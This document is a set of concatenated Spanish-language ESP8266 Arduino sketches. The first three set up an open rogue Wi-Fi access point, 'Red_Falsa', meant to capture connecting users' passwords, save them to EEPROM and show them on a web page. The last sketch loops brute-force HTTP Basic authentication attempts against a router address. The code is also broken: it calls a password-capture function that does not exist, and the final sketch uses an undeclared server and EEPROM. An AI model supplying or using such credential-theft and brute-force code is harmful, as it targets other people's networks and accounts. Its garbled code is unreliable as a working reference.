#include <ESP8266WiFi.h>
#include <EEPROM.h>

const char* ssid = "Red_Falsa";
const char* password = "";

WiFiEventHandler stationConnectedHandler;

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  EEPROM.begin(512);
  stationConnectedHandler = WiFi.onSoftAPModeStationConnected([](const WiFiEventStationModeConnected& evt) {
    Serial.println("Usuario conectado");
    Serial.print("Dirección MAC: ");
    Serial.println(evt.mac);
    Serial.print("IP: ");
    Serial.println(evt.ip);
    String contraseña = WiFi.softAPgetStationPassword(evt.station);
    Serial.print("Contraseña: ");
    Serial.println(contraseña);
    EEPROM.put(0, contraseña);
    EEPROM.commit();
  });
}

void loop() {
  // No es necesario hacer nada aquí
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

const char* ssid = "Red_Falsa";
const char* password = "";
const int botonPin = 0; // Pin del botón

ESP8266WebServer server(80);

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  EEPROM.begin(512);
  pinMode(botonPin, INPUT_PULLUP);
  server.on("/", mostrarContraseña);
  server.begin();
}

void loop() {
  server.handleClient();
  if (digitalRead(botonPin) == LOW) {
    delay(50); // Anti-rebote
    mostrarContraseña();
  }
}

void mostrarContraseña() {
  String contraseña = EEPROM.readString(0);
  String html = "<html><body><h1>Contraseña: " + contraseña + "</h1></body></html>";
  server.send(200, "text/html", html);
}


#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

const char* ssid = "Red_Falsa";
const char* password = "";
const int botonPin = 0; // Pin del botón

ESP8266WebServer server(80);

WiFiEventHandler stationConnectedHandler;

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  EEPROM.begin(512);
  pinMode(botonPin, INPUT_PULLUP);
  server.on("/", mostrarContraseña);
  server.begin();
  stationConnectedHandler = WiFi.onSoftAPModeStationConnected([](const WiFiEventStationModeConnected& evt) {
    Serial.println("Usuario conectado");
    Serial.print("Dirección MAC: ");
    Serial.println(evt.mac);
    Serial.print("IP: ");
    Serial.println(evt.ip);
    String contraseña = WiFi.softAPgetStationPassword(evt.station);
    Serial.print("Contraseña: ");
    Serial.println(contraseña);
    EEPROM.put(0, contraseña);
    EEPROM.commit();
  });
}

void loop() {
  server.handleClient();
  if (digitalRead(botonPin) == LOW) {
    delay(50); // Anti-rebote
    mostrarContraseña();
  }
}

#include <ESP8266WiFi.h>

const char* ssid = "tu_red_wifi";
const char* direccion_ip_objetivo = "192.168.1.1";

WiFiClient cliente;

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Conectando a la red WiFi...");
  }
  Serial.println("Conectado a la red WiFi");
}

void loop() {
  // Generar combinaciones de contraseñas y claves de autenticación
  String contraseña = generarContraseñaAleatoria();
  String claveAutenticacion = generarClaveAutenticacionAleatoria();
  
  // Intentar autenticarse en la red WiFi objetivo
  if (cliente.connect(direccion_ip_objetivo, 80)) {
    Serial.println("Conectado al servidor objetivo");
    cliente.println("GET / HTTP/1.1");
    cliente.println("Host: " + String(direccion_ip_objetivo));
    cliente.println("Authorization: Basic " + claveAutenticacion);
    cliente.println();
  } else {
    Serial.println("Error al conectar al servidor objetivo");
  }
  delay(10);
}

String generarContraseñaAleatoria() {
  // Generar una contraseña aleatoria
  String contraseña = "";
  for (int i = 0; i < 10; i++) {
    contraseña += char(random(65, 90)); // Letras mayúsculas
  }
  return contraseña;
}

String generarClaveAutenticacionAleatoria() {
  // Generar una clave de autenticación aleatoria
  String claveAutenticacion = "";
  for (int i = 0; i < 10; i++) {
    claveAutenticacion += char(random(65, 90)); // Letras mayúsculas
  }
  return claveAutenticacion;
}

void mostrarContraseña() {
  String contraseña = EEPROM.readString(0);
  String html = "<html><body><h1>Contraseña: " + contraseña + "</h1></body></html>";
  server.send(200, "text/html", html);
}